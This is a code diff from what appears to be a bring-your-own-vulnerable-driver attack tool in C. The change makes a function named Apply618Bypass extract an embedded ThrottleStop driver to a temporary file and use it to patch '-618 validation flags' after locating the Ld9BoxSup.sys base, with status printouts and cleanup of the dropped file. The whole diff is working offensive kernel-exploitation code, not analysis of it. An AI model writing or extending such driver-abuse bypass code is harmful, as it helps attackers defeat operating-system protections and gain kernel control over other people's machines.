@@ -18,6 +18,7 @@
 #include "../byovd/supdrv.h"
 #include "../byovd/throttlestop.h"
 #include "../byovd/nt_defs.h"
+#include "../resources/resource_extract.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -160,12 +161,21 @@ static BOOL Apply618Bypass(void) {
 
     printf("[+] Ld9BoxSup.sys base: 0x%llX\n", ld9BoxBase);
 
+    // Extract ThrottleStop driver from embedded resources
+    wchar_t* tsDriverPath = Resource_ExtractToTemp(EMBEDDED_DRIVER_THROTTLESTOP);
+    if (!tsDriverPath) {
+        printf("[!] Failed to extract ThrottleStop driver from resources\n");
+        printf("    Proceeding without bypass\n");
+        return TRUE;
+    }
+    printf("[+] Extracted ThrottleStop to: %ls\n", tsDriverPath);
+
     // Initialize ThrottleStop context
     TS_CTX tsCtx;
     TS_Init(&tsCtx);
 
-    // Initialize ThrottleStop driver
-    if (TS_Initialize(&tsCtx, NULL)) {
+    // Initialize ThrottleStop driver with extracted path
+    if (TS_Initialize(&tsCtx, tsDriverPath)) {
         printf("[+] ThrottleStop initialized\n");
 
         // Patch the -618 validation flags
@@ -183,6 +193,10 @@ static BOOL Apply618Bypass(void) {
         printf("[!] ThrottleStop init failed: %s\n", TS_GetLastError(&tsCtx));
         printf("    Proceeding without bypass\n");
     }
+
+    // Clean up extracted file
+    Resource_Cleanup(tsDriverPath);
+    free(tsDriverPath);
 
     printf("[*] -618 bypass complete\n");
     return TRUE;
